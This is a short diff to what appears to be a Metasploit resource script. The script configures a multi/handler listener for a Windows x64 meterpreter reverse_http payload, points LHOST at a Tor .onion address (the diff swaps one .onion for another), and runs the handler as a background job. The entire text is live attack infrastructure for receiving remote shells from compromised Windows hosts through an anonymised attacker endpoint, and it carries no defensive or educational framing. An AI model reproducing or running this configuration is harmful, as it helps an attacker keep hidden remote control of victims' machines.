@@ -1,5 +1,5 @@
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
-set LHOST aywyfbvfylb3fjtzpxdpyvvrigpgewo76cb6k5w6zhbcfkdub4nnpiid.onion
+set LHOST eubw6taemp4wg6ghsppt6cjxmruqh2b5u6ouqd2wc6qcemgciz3lkdid.onion
 set LPORT 4444
-exploit -j
+exploit -j -z
